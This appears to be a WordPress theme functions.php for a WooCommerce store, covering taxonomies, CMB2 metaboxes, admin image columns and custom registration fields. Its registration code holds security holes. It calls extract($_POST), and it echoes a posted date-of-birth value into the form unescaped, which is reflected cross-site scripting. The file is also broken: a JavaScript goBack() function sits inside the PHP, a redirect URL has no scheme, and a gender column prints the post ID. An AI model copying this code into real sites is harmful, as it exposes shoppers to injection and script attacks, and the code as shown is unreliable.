<?php




$hoot_base_dir = trailingslashit( get_template_directory() );
/* Load the Core framework and theme files */
add_theme_support( 'post-thumbnails' );
require_once( $hoot_base_dir . 'hybrid/hybrid.php' );
require_once( $hoot_base_dir . 'hybrid/extend/extend.php' );
require_once( $hoot_base_dir . 'include/hoot-theme.php' );
/* Framework and Theme Setup files loaded */
do_action( 'hoot_loaded' );
/* Launch the Hybrid framework. */
new Hybrid();
$hybridextend = new Hybrid_Extend();
/* Framework Setup complete */
do_action( 'hybrid_after_setup' );
/* Launch the Theme */
$hoot_theme = new Hoot_Theme();
/* Hoot Theme Setup complete */
do_action( 'hoot_theme_after_setup' );

do_action( 'woocommerce_set_cart_cookies', TRUE );



if ( file_exists( __DIR__ . '/inc/CMB2-trunk/init.php' ) ) {
  require_once __DIR__ . '/inc/CMB2-trunk/init.php';
} elseif ( file_exists(  __DIR__ . '/inc/CMB2-trunk/init.php' ) ) {
  require_once __DIR__ . '/inc/CMB2-trunk/init.php';
}
if ( file_exists( __DIR__ . '/inc/cmb2-taxonomy-master/init.php' ) ) {
require_once __DIR__ . '/inc/cmb2-taxonomy-master/init.php';
}
if ( file_exists( __DIR__ . '/custome-function.php' ) ) {
require_once __DIR__ . '/custome-function.php';
}
if ( file_exists( __DIR__ . '/custome-shortcode.php' ) ) {
require_once __DIR__ . '/custome-shortcode.php';
}
if ( file_exists( __DIR__ . '/seller-function.php' ) ) {
require_once __DIR__ . '/seller-function.php';
}
if ( file_exists( __DIR__ . '/inc/integration-cmb2-qtranslate-master/cmb2-qtranslate.php' ) ) {
require_once __DIR__ . '/inc/integration-cmb2-qtranslate-master/cmb2-qtranslate.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-fly-to-cart/woocommerce-fly-to-cart.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-fly-to-cart/woocommerce-fly-to-cart.php';
}
if ( file_exists( __DIR__ . '/inc/share-this/sharethis.php' ) ) {
require_once __DIR__ . '/inc/share-this/sharethis.php';
}

if ( file_exists( __DIR__ . '/inc/auto-login-when-resister/auto-login-when-resister.php' ) ) {
require_once __DIR__ . '/inc/auto-login-when-resister/auto-login-when-resister.php';
}

if ( file_exists( __DIR__ . '/inc/woocommerce-max-quantity.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-max-quantity.php';
}


function my_wc_cart_count() {
    if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
        $count = WC()->cart->cart_contents_count;
        ?>
		<a class="cart-contents" href="<?php echo WC()->cart->get_cart_url(); ?>" title="<?php _e( 'View your shopping cart' ); ?>">
		<?php if ( $count > 0 ) { ?>
            <span class="cart-contents-count"><?php echo esc_html( $count ); ?></span>
        <?php } ?>
		</a><?php 
		}
	
}
add_action( 'your_theme_header_top', 'my_wc_cart_count' );
function my_header_add_to_cart_fragment( $fragments ) {
    ob_start();
    $count = WC()->cart->cart_contents_count;
    ?><a class="cart-contents" href="<?php echo WC()->cart->get_cart_url(); ?>" title="<?php _e( 'View your shopping cart' ); ?>"><?php
    if ( $count > 0 ) {
        ?>
        <span class="cart-contents-count"><?php echo esc_html( $count ); ?></span>
        <?php            
    }
        ?>
		</a><?php
    $fragments['a.cart-contents'] = ob_get_clean();
    return $fragments;
}
add_filter( 'woocommerce_add_to_cart_fragments', 'my_header_add_to_cart_fragment' );
function add_custom_taxonomies() {
  register_taxonomy('collection', 'product', array(
    'hierarchical' => true,
    'labels' => array(
      'name' => _x( 'Collections', 'taxonomy general name' ),
      'singular_name' => _x( 'Collection', 'taxonomy singular name' ),
      'search_items' =>  __( 'Search Collections' ),
      'all_items' => __( 'All Collections' ),
      'parent_item' => __( 'Parent Collection' ),
      'parent_item_colon' => __( 'Parent Collection:' ),
      'edit_item' => __( 'Edit Collection' ),
      'update_item' => __( 'Update Collection' ),
      'add_new_item' => __( 'Add New Collection' ),
      'new_item_name' => __( 'New Collection Name' ),
      'menu_name' => __( 'Collections' ),
    ),
    'rewrite' => array(
      'slug' => 'collections',
      'with_front' => false,
      'hierarchical' => true
    ),
  ));
}
add_action( 'init', 'add_custom_taxonomies', 0 );



function wpdocs_theme_name_scripts() {
    wp_enqueue_style( 'slick', get_template_directory_uri() . '/css/slick.css');
	wp_enqueue_style( 'slick-theme', get_template_directory_uri() . '/css/slick-theme.css');
	wp_enqueue_style( 'custome', get_template_directory_uri() . '/css/custom.css');
	wp_enqueue_style( 'custome-new', get_template_directory_uri() . '/css/custom-new.css');
    wp_enqueue_style( 'custom-lagobe', get_template_directory_uri() . '/css/custom-lagobe.css'); /*Lagobe*/
	wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css');
	wp_enqueue_style( 'bootstar', get_template_directory_uri() . '/css/bootstrap.min.css');
	wp_enqueue_style( 'select2Option', get_template_directory_uri() . '/css/select2OptionPicker.css');
	
	wp_enqueue_style( 'wink', get_template_directory_uri() . '/css/example.wink.css');
	wp_enqueue_script( 'hidepass', get_template_directory_uri() . '/js/hideShowPassword.js', false);
	wp_enqueue_script( 'custome-js', get_template_directory_uri() . '/js/custom.js', true);
	wp_enqueue_script( 'new-js', get_template_directory_uri() . '/js/new.js', true);
	wp_enqueue_script( 'slick-js', get_template_directory_uri() . '/js/slick.min.js');
	wp_enqueue_script( 'js-validate', get_template_directory_uri() . '/js/jquery.validate.min.js', false);
	wp_enqueue_script('select2Option-js',  get_template_directory_uri() . '/js/jQuery.select2OptionPicker.js','1.0.0',true);
	wp_enqueue_script( 'wc-cart', get_template_directory_uri() . '/inc/woocommerce-ajax-cart/assets/js/frontend/cart.js', true );
	wp_enqueue_script('wpis-slick-js',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/js/slick.min.js','1.6.0', false);
	wp_enqueue_script('wpis-fancybox-js',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/js/jquery.fancybox.js' ,'1.0', true);
	wp_enqueue_script('wpis-zoom-js',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/js/jquery.zoom.min.js','1.0', true);
	wp_enqueue_script('wpis-front-js',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/js/wpis.front.js','1.0', true);
	wp_enqueue_style('wpis-fancybox-css',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/css/fancybox.css','1.0', true);
	wp_enqueue_style('wpis-front-css',  get_template_directory_uri() . '/inc/woo-product-images-slider/assets/css/wpis-front.css','1.0', true);
}
add_action( 'wp_enqueue_scripts', 'wpdocs_theme_name_scripts' );







function wpdocs_theme_custome() {
	wp_enqueue_script( 'custome-main', get_template_directory_uri() . '/js/custome-main.js',array(), true);
}
add_action( 'wp_footer', 'wpdocs_theme_custome' );



function wpadmin_js_implement() {
	wp_enqueue_script('trans-main-js',get_template_directory_uri().'/inc/integration-cmb2-qtranslate-master/dist/scripts/main.js',true);
}
add_action( 'admin_enqueue_scripts', 'wpadmin_js_implement');
add_image_size( 'category-img', 200, 300, true );
add_image_size( 'collection-large',640,400, true );
add_image_size( 'collection-mediun',320,356, true );
add_image_size( 'cat-page-img',200,200, true );
add_image_size( 'loop-meta-img',1220,512);
require_once __DIR__ . '/inc/redux-framework/ReduxCore/framework.php';
require_once __DIR__ . '/inc/custom-config.php';
require_once __DIR__ . '/inc/instagram-slider-widget/instaram_slider.php';
function remove_customizer_settings( $wp_customize ){
  $wp_customize->remove_section('slider_html');
  $wp_customize->remove_section('frontpage');
}
add_action( 'customize_register', 'remove_customizer_settings', 20 );
function remove_some_widgets(){
	// Unregister some of the TwentyTen sidebars
	unregister_sidebar( 'hoot-leftbar-top' );
	register_sidebar( 'hoot-leftbar-bottom' );
	register_sidebar( 'hoot-content-top' );
	unregister_sidebar( 'hoot-sub-footer' );
	
	unregister_sidebar( 'hoot-footer-a' );
	unregister_sidebar( 'hoot-footer-b' );
	unregister_sidebar( 'hoot-footer-c' );
	unregister_sidebar( 'hoot-frontpage-area_a_1' );
	unregister_sidebar( 'hoot-frontpage-area_b_1' );
	unregister_sidebar( 'hoot-frontpage-area_b_2' );
	unregister_sidebar( 'hoot-frontpage-area_c_1' );
	unregister_sidebar( 'hoot-frontpage-area_d_1' );
	unregister_sidebar( 'hoot-frontpage-area_e_1' );
	unregister_sidebar( 'hoot-woocommerce-sidebar' );
	
	register_sidebar( array(
		'name' => __( 'Recent View Products', 'wpb' ),
		'id' => 'sidebar-recent',
		'description' => __( 'The main sidebar appears on the right on each page except the front page template', 'wpb' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Left Fillter Top', 'wpb' ),
		'id' => 'sidebar-left-top',
		'description' => __( 'The main sidebar appears on the Left on each page except the front page template', 'wpb' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( 'Left Fillter Bottom', 'wpb' ),
		'id' => 'sidebar-left-bottom',
		'description' => __( 'The main sidebar appears on the Left on each page except the front page template', 'wpb' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Checkout Login', 'wpb' ),
		'id' => 'checkout-login',
		'description' => __( 'The main sidebar appears on the Checkout page', 'wpb' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
}
add_action( 'widgets_init', 'remove_some_widgets', 11 );
function add_slug_body_class( $classes ) {
global $post;
if ( isset( $post ) ) {
$classes[] = $post->post_type . '-' . $post->post_name;
}
return $classes;
}
add_filter( 'body_class', 'add_slug_body_class' );
add_action( 'init', 'woocommerce_clear_cart_url' );
function woocommerce_clear_cart_url() {
global $woocommerce;
	if ( isset( $_GET['empty-cart'] ) ) {
		$woocommerce->cart->empty_cart();
		wp_redirect('example.com/shop');
	}
}
remove_action( 'woocommerce_cart_collaterals', 'woocommerce_cross_sell_display' );


//add_action('customize_register','rse_section');

/*
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wooajaxcart.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wooajaxcart.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-settings.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-settings.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-demo.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-demo.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-qty-buttons.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-qty-buttons.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-qty-select.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-qty-select.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-cart-update.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-cart-update.php';
}
if ( file_exists( __DIR__ . '/inc/woocommerce-ajax-cart/wac-js-calls.php' ) ) {
require_once __DIR__ . '/inc/woocommerce-ajax-cart/wac-js-calls.php';
}*/

/*if ( file_exists( __DIR__ . '/inc/woo-custom-stock-status/woo-custom-stock-status.php' ) ) {
require_once __DIR__ . '/inc/woo-custom-stock-status/woo-custom-stock-status.php';
}*/




add_action( 'cmb2_admin_init', 'cmb2_sample_metaboxes' );
function cmb2_sample_metaboxes() {
	$prefix = 'product_';
	$cmb = new_cmb2_box( array(
		'id'            => 'test_metabox',
		'title'         => __( 'Product Fields', 'cmb2' ),
		'object_types'  => array( 'product', ), // Post type
		'context'       => 'normal',
		'priority'      => 'high',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		// 'closed'     => true, // Keep the metabox closed by default
	) );
	// Regular text field
	$cmb->add_field( array(
		'name'       => __( 'Select Gender', 'cmb2' ),
		'desc'       => __( 'Select Gender for this Product', 'cmb2' ),
		'id'         => $prefix.'gender',
		'type'       => 'radio',
		'options' => array(
			'gay' => 'Gay',
			'lesbian' => 'Lesbian',
		),
	) );
	// URL text field
	$cmb->add_field( array(
		'name' => __( 'Product Highlight', 'cmb2' ),
		'desc' => __( 'field description (optional)', 'cmb2' ),
		'id'   => $prefix.'highlight',
		'type' => 'text_medium',
		'attributes' => array(
    		'class' => 'cmb2-qtranslate',
			 'data-cmb2-qtranslate' => true
		)
		// 'protocols' => array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'gopher', 'nntp', 'feed', 'telnet'), // Array of allowed protocols
		// 'repeatable' => true,
	) );
	
	
	
	
	$cmb = new_cmb2_box( array(
		'id'            => 'test_help',
		'title'         => __( 'Services', 'cmb2' ),
		'object_types' => array( 'page' ), // post type
		'show_on'      => array( 'key' => 'page-template', 'value' => 'help.php' ),
		'context'       => 'normal',
		'priority'      => 'high',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		// 'closed'     => true, // Keep the metabox closed by default
	) );
	
	
	$group_field_id = $cmb->add_field( array(
	'id'          => 'ser_test_help_group',
	'type'        => 'group',
	'description' => __( 'Add Services Entry', 'cmb2' ),
	// 'repeatable'  => false, // use false if you want non-repeatable group
	'options'     => array(
		'group_title'   => __( 'Entry {#}', 'cmb2' ), // since version 1.1.4, {#} gets replaced by row number
		'add_button'    => __( 'Add Another Entry', 'cmb2' ),
		'remove_button' => __( 'Remove Entry', 'cmb2' ),
		'sortable'      => true, // beta
		// 'closed'     => true, // true to have the groups closed by default
	),
	) );
	// Id's for group's fields only need to be unique for the group. Prefix is not needed.
	$cmb->add_group_field( $group_field_id, array(
		'name' => 'Title',
		'id'   => $prefix.'ser_title',
		'type' => 'text',
		// 'repeatable' => true, // Repeatable fields are supported w/in repeatable groups (for most types)
	) );
	$cmb->add_group_field( $group_field_id, array(
		'name' => 'Icon',
		'id'   => $prefix.'ser_icon',
		'type' => 'file',
		'preview_size' => array( 100, 100 ),
		'options' => array(
			'url' => true, // Hide the text input for the url
		),
		'text'    => array(
			'add_upload_file_text' => 'Add File' // Change upload button text. Default: "Add or Upload File"
		),
	) );
	$cmb->add_group_field( $group_field_id, array(
		'name' => 'URL',
		'id'   => $prefix.'ser_url',
		'type' => 'text_url',
	) );
	
	
	
	
	
	
	
	
	
	
	
	
	
	// Add other metaboxes as needed
}
add_filter('cmb2_admin_init', 'product_size_chart');
function product_size_chart() {
	$prefix = 'product_';
	$cmb = new_cmb2_box( array(
		'id'            => 'size_chart',
		'title'         => __( 'Product Size Chart', 'cmb2' ),
		'object_types'  => array( 'yith-wcpsc-wc-chart', ), // Post type
		'context'       => 'normal',
		'priority'      => 'low',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		// 'closed'     => true, // Keep the metabox closed by default
	) );
	// Regular text field
	/*$cmb->add_field( array(
		'name'       => __( 'Add Product Size Chart', 'cmb2' ),
		'desc'       => __( 'Add product Size chart Using top Button', 'cmb2' ),
		'id'         => $prefix.'size_chart',
		'type'       => 'wysiwyg',
		'options' => array(
					'wpautop' => true, // use wpautop?
					'media_buttons' => true, // show insert/upload button(s)
					'textarea_name' => $editor_id, // set the textarea name to something different, square brackets [] can be used here
					'textarea_rows' => get_option('default_post_edit_rows', 10), // rows="..."
					'tabindex' => '',
					'editor_css' => '', // intended for extra styles for both visual and HTML editors buttons, needs to include the `<style>` tags, can use "scoped".
					'editor_class' => '', // add extra class(es) to the editor textarea
					'teeny' => false, // output the minimal editor config used in Press This
					'dfw' => false, // replace the default fullscreen with DFW (needs specific css)
					'tinymce' => true, // load TinyMCE, can be used to pass settings directly to TinyMCE using an array()
					'quicktags' => true // load Quicktags, can be used to pass settings directly to Quicktags using an array()
		),
	) );*/
	// URL text field
	$cmb->add_field( array(
		'name' => __( 'Product Size Chart Image', 'cmb2' ),
		'desc' => __( 'Add product Size chart Image here', 'cmb2' ),
		'id'   => $prefix.'size_chart_img',
		'type' => 'file',
		// 'protocols' => array('http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'gopher', 'nntp', 'feed', 'telnet'), // Array of allowed protocols
		// 'repeatable' => true,
	) );
}





add_filter('cmb2-taxonomy_meta_boxes', 'cmb2_taxonomy_sample_metaboxes');
function cmb2_taxonomy_sample_metaboxes( array $meta_boxes ) {
	$prefix = '_cmb2_';
	
	
	$meta_boxes['test_metabox'] = array(
		'id'            => 'texo_metabox',
		'title'         => __( 'Cateogy Metabox', 'cmb2' ),
		'object_types'  => array( 'product_cat','collection'), // Taxonomy
		'context'       => 'normal',
		'priority'      => 'high',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		'fields'        => array(
			array(
				'name'       => __( 'Man Image', 'cmb2' ),
				'desc'       => __( 'Add Man Image', 'cmb2' ),
				'id'         => $prefix . 'man_img',
				'type'       => 'file',
				'preview_size' => array( 50, 50 ), 
			),
			array(
				'name'       => __( 'Woman Image', 'cmb2' ),
				'desc'       => __( 'Add Lesbian Image', 'cmb2' ),
				'id'         => $prefix . 'les_img',
				'type'       => 'file',
				'preview_size' => array( 50, 50 ), 
			),
			
			array(
				'name'       => __( 'Combination Image', 'cmb2' ),
				'desc'       => __( 'Add Combanitation Image', 'cmb2' ),
				'id'         => $prefix . 'com_img',
				'type'       => 'file',
				'preview_size' => array( 50, 50 ), 
			),
			
			
			
			
			
			/*array(
				'name'       => __( 'Banner Image', 'cmb2' ),
				'desc'       => __( 'Add Banner Image', 'cmb2' ),
				'id'         => $prefix . 'banner_img',
				'type'       => 'file',
				'preview_size' => array(200, 200), 
			),*/
			
		),
	);
	
	
	
	$meta_boxes['texs_metabox'] = array(
		'id'            => 'texs_metabox',
		'title'         => __( 'Cateogy Metabox', 'cmb2' ),
		'object_types'  => array( 'product_cat','collection','pwb-brand' ), // Taxonomy
		'context'       => 'normal',
		'priority'      => 'high',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		'fields'        => array(
				array(
				'name'       => __( 'Banner Image', 'cmb2' ),
				'desc'       => __( 'Add Banner Image', 'cmb2' ),
				'id'         => $prefix . 'banner_img',
				'type'       => 'file',
				'preview_size' => array(200, 200), 
				),
				),
	);
	
	
	/*$meta_boxes['test_metabox'] = array(
		'id'            => 'text_meta_brand',
		'title'         => __( 'Cateogy Metabox', 'cmb2' ),
		'object_types'  => array( 'pwb-brand','product_cat','collection'), // Taxonomy
		'context'       => 'normal',
		'priority'      => 'high',
		'show_names'    => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		'fields'        => array(
			array(
				'name'       => __( 'Banner Image', 'cmb2' ),
				'desc'       => __( 'Add Banner Image', 'cmb2' ),
				'id'         => $prefix . 'banner_img',
				'type'       => 'file',
				'preview_size' => array(200, 200), 
				),
		),
	);*/
	
	
	return $meta_boxes;
}




		
			
			
function pippin_get_image_id($image_url) {
	global $wpdb;
	$attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $image_url )); 
        return $attachment[0]; 
}
/**************Product Category Image**************/
add_filter('manage_edit-product_cat_columns', 'add_feature_group_column' );
function add_feature_group_column( $columns ){
    $columns['feature_group'] = __( 'Lesbian', 'my_plugin' );
    return $columns;
}
add_filter('manage_product_cat_custom_column', 'add_feature_group_column_content', 10, 3 );
function add_feature_group_column_content( $content, $column_name, $term_id ){
    global $feature_groups;
    if( $column_name !== 'feature_group' ){
        return $content;
    }
    $term_id = absint( $term_id );
    $feature_group = get_term_meta( $term_id, '_cmb2_les_img', true );
	$image_id = pippin_get_image_id($feature_group);
	$image_thumb = wp_get_attachment_image_src($image_id, 'thumbnail');
    if( !empty( $feature_group ) ){
        $content .= '<img src="'.$image_thumb[0].'" alt="les-image" width="50" height="50"/>';
    }
    return $content;
}
add_filter( 'manage_edit-product_cat_sortable_columns', 'add_feature_group_column_sortable' );
function add_feature_group_column_sortable( $sortable ){
    $sortable[ 'feature_group' ] = 'feature_group';
    return $sortable;
}
add_filter('manage_edit-product_cat_columns', 'add_com_group_column' );
function add_com_group_column( $columns ){
    $columns['com_group'] = __( 'Combine', 'my_plugin' );
    return $columns;
}
add_filter('manage_product_cat_custom_column', 'add_com_group_column_content', 10, 3 );
function add_com_group_column_content( $content, $column_name, $term_id ){
    global $feature_groups;
    if( $column_name !== 'com_group' ){
        return $content;
    }
    $term_id = absint( $term_id );
    $feature_group = get_term_meta( $term_id, '_cmb2_com_img', true );
	$image_id = pippin_get_image_id($feature_group);
	$image_thumb = wp_get_attachment_image_src($image_id, 'thumbnail');
    if( !empty( $feature_group ) ){
        $content .= '<img src="'.$image_thumb[0].'" alt="com-image" width="50" height="50"/>';
    }
    return $content;
}
add_filter( 'manage_edit-product_cat_sortable_columns', 'add_com_group_column_sortable' );
function add_com_group_column_sortable( $sortable ){
    $sortable[ 'com_group' ] = 'com_group';
    return $sortable;
}
/**************End Product Category Image***************/
/**************Product Category Image**************/
add_filter('manage_edit-collection_columns', 'add_com_collection_man' );
function add_com_collection_man( $columns ){
    $columns['com_group_man'] = __( 'Man', 'my_plugin' );
    return $columns;
}
add_filter('manage_collection_custom_column', 'add_com_collection_column_man', 10, 3 );
function add_com_collection_column_man( $content, $column_name, $term_id ){
    global $com_group_man;
    if( $column_name !== 'com_group_man' ){
        return $content;
    }
    $term_id = absint( $term_id );
    $com_group_man = get_term_meta( $term_id, '_cmb2_man_img', true );
	$image_id = pippin_get_image_id($com_group_man);
	$image_thumb = wp_get_attachment_image_src($image_id, 'thumbnail');
    if( !empty( $com_group_man ) ){
        $content .= '<img src="'.$image_thumb[0].'" alt="les-image" width="75" height="75"/>';
    }
    return $content;
}
add_filter( 'manage_edit-collection_sortable_columns', 'add_com_collection_column_sortable_man' );
function add_com_collection_column_sortable_man( $sortable ){
    $sortable[ 'com_group_man' ] = 'com_group_man';
    return $sortable;
}
add_filter('manage_edit-collection_columns', 'add_feature_collection_column' );
function add_feature_collection_column( $columns ){
    $columns['feature_group'] = __( 'Lesbian', 'my_plugin' );
    return $columns;
}
add_filter('manage_collection_custom_column', 'add_feature_collection_column_content', 10, 3 );
function add_feature_collection_column_content( $content, $column_name, $term_id ){
    global $feature_groups;
    if( $column_name !== 'feature_group' ){
        return $content;
    }
    $term_id = absint( $term_id );
    $feature_group = get_term_meta( $term_id, '_cmb2_les_img', true );
	$image_id = pippin_get_image_id($feature_group);
	$image_thumb = wp_get_attachment_image_src($image_id, 'thumbnail');
    if( !empty( $feature_group ) ){
        $content .= '<img src="'.$image_thumb[0].'" alt="les-image" width="75" height="75"/>';
    }
    return $content;
}
add_filter( 'manage_edit-collection_sortable_columns', 'add_feature_collection_column_sortable' );
function add_feature_collection_column_sortable( $sortable ){
    $sortable[ 'feature_group' ] = 'feature_group';
    return $sortable;
}
add_filter('manage_edit-collection_columns', 'add_com_collection_column' );
function add_com_collection_column( $columns ){
    $columns['com_group'] = __( 'Combination', 'my_plugin' );
    return $columns;
}
add_filter('manage_collection_custom_column', 'add_com_collection_column_content', 10, 3 );
function add_com_collection_column_content( $content, $column_name, $term_id ){
    global $com_group;
    if( $column_name !== 'com_group' ){
        return $content;
    }
    $term_id = absint( $term_id );
    $com_group = get_term_meta( $term_id, '_cmb2_com_img', true );
	$image_id = pippin_get_image_id($com_group);
	$image_thumb = wp_get_attachment_image_src($image_id, 'thumbnail');
    if( !empty( $com_group ) ){
        $content .= '<img src="'.$image_thumb[0].'" alt="les-image" width="75" height="75"/>';
    }
    return $content;
}
add_filter( 'manage_edit-collection_sortable_columns', 'add_com_collection_column_sortable' );
function add_com_collection_column_sortable( $sortable ){
    $sortable[ 'com_group' ] = 'com_group';
    return $sortable;
}
/**************End Product Category Image***************/
/**************Product Post Gender**************/
function add_product_columns($columns) {
    return array_merge($columns,
              array('project_date' =>__( 'Gender')));
}
add_filter('manage_product_posts_columns' , 'add_product_columns');
add_action( 'manage_product_custom_column' , 'custom_columns' );
function custom_columns( ) {
			global $post;
			$metaData = get_post_meta( $post->ID, 'product_gender', true );
			echo $post->ID;
	
}
function goBack() {
    window.history.back();
}
/*add_filter('woocommerce_get_checkout_url', 'dj_redirect_checkout');
function dj_redirect_checkout($url) {
 global $woocommerce;
 if(is_cart()){
 	  if ( !is_user_logged_in() && is_cart() )
	  $checkout_url = site_url().'/my-account';
	  
	  if( is_user_logged_in() && !WC()->cart->is_empty())
	  $checkout_url = site_url().'/checkout';
	  
 }
 else { 
 //other url or leave it blank.
 }
 return  $checkout_url; 
}
*/
/*function woocommerce_custom_redirects($url) {
	
    // Case1: Non logged user on checkout page (cart empty or not empty)
    if ( !is_user_logged_in() && is_cart() )
        wp_redirect( get_permalink( get_option('15') ) );
    // Case2: Logged user on my account page with something in cart
    if( is_user_logged_in() && !WC()->cart->is_empty() && is_account_page() )
        wp_redirect( get_permalink( get_option('14') ) );
}
add_action('woocommerce_get_checkout_url', 'woocommerce_custom_redirects');*/
add_filter('woocommerce_registration_errors', 'registration_errors_validation', 10,3);
function registration_errors_validation($reg_errors, $sanitized_user_login, $user_email) {
	global $woocommerce;
	extract( $_POST );
	if ( strcmp( $password, $password2 ) !== 0 ) {
		return new WP_Error( 'registration-error', __( 'Passwords do not match.', 'woocommerce' ) );
	}
	return $reg_errors;
}
add_action( 'woocommerce_register_form', 'wc_register_form_password_repeat' );
function wc_register_form_password_repeat() {
	?>
	<p class="form-row form-row-wide">
		<label for="reg_password2"><?php _e( 'Password Repeat', 'woocommerce' ); ?> <span class="required">*</span></label>
		<input type="password" class="input-text" name="password2" id="reg_password2" value="<?php if ( ! empty( $_POST['password2'] ) ) echo esc_attr( $_POST['password2'] ); ?>" placeholder="Repeat Password"/>
	</p>
	<?php
}
function wooc_extra_register_fields() {
    ?>
    <p class="form-row form-row-wide">
    <label for="reg_billing_first_name"><?php _e( 'First Name', 'woocommerce' ); ?> <span class="required">*</span></label>
    <input type="text" class="input-text" name="billing_first_name" id="reg_billing_first_name" value="<?php if ( ! empty( $_POST['billing_first_name'] ) ) esc_attr_e( $_POST['billing_first_name'] ); ?>" placeholder="First Name"/>
    </p>
	
	<p class="form-row form-row-wide">
    <label for="reg_billing_last_name"><?php _e( 'Last Name', 'woocommerce' ); ?> <span class="required">*</span></label>
   <input type="text" class="input-text" name="billing_last_name" id="reg_billing_last_name" value="<?php if ( ! empty( $_POST['billing_last_name'] ) ) esc_attr_e( $_POST['billing_last_name'] ); ?>" placeholder="Last Name"/>
    </p>
	
	
    <?php
}
add_action( 'woocommerce_register_form_start', 'wooc_extra_register_fields' );
function wooc_validate_extra_register_fields( $username, $email, $validation_errors ) {
    if ( isset( $_POST['billing_first_name'] ) && empty( $_POST['billing_first_name'] ) ) {
        $validation_errors->add( 'billing_first_name_error', __( 'First Name is Required.', 'woocommerce' ) );
    }
	
	if ( isset( $_POST['billing_last_name'] ) && empty( $_POST['billing_last_name'] ) ) {
        $validation_errors->add( 'billing_last_name_error', __( 'Last Name is Required.', 'woocommerce' ) );
    }
	
}
add_action( 'woocommerce_register_post', 'wooc_validate_extra_register_fields', 10, 3 );
function wooc_save_extra_register_fields( $customer_id ) {
    if ( isset( $_POST['billing_first_name'] ) ) {
        update_user_meta( $customer_id, 'first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
        update_user_meta( $customer_id, 'billing_first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
    }
	
	if ( isset( $_POST['billing_last_name'] ) ) {
        update_user_meta( $customer_id, 'last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
        update_user_meta( $customer_id, 'billing_last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
    }
		
	
	
	
}
add_action( 'woocommerce_created_customer', 'wooc_save_extra_register_fields' );
/* To add WooCommerce registration form custom fields. */
function WC_extra_registation_fields() {?>
    <p class="form-row form-row-first">
        <label for="reg_billing_gender"><?php _e( 'Gender', 'woocommerce' ); ?></label>
        <select class="input-text" name="billing_myfield16" id="reg_billing_gender">
			<option value="" disabled selected>My Genders</option> 
			<option <?php if ( ! empty( $_POST['billing_myfield16'] ) && $_POST['billing_myfield16'] == 'male') esc_attr_e( 'selected' ); ?> value="male">Male</option> 
			<option <?php if ( ! empty( $_POST['billing_myfield16'] ) && $_POST['billing_myfield16'] == 'female') esc_attr_e( 'selected' ); ?> value="female">Female</option>
			<option <?php if ( ! empty( $_POST['billing_myfield16'] ) && $_POST['billing_myfield16'] == 'other') esc_attr_e( 'selected' ); ?> value="other">Other</option>
        </select> 
		
		<input type="text" id="usr-dob" placeholder="dd/mm/yyyy" tabindex="30" size="25" value="<?php echo $_POST['billing_myfield15']; ?>" name="billing_myfield15" />
    </p>
    
    <div class="clear"></div>
    <?php
}
add_action( 'woocommerce_register_form', 'WC_extra_registation_fields');
/* To save WooCommerce registration form custom fields. */
function WC_save_registration_form_fields($customer_id) {
    
    //Gender field
    if (isset($_POST['billing_myfield16'])) {
        update_user_meta($customer_id, 'billing_myfield16', sanitize_text_field($_POST['billing_myfield16']));
    }	
		update_user_meta($customer_id, 'billing_myfield15', sanitize_text_field($_POST['billing_myfield15']));
		update_user_meta($customer_id, 'user_login', sanitize_text_field($_POST['email']));
		update_user_meta($customer_id, 'nickname', sanitize_text_field($_POST['email']));
		
		
		
		
		
    
}
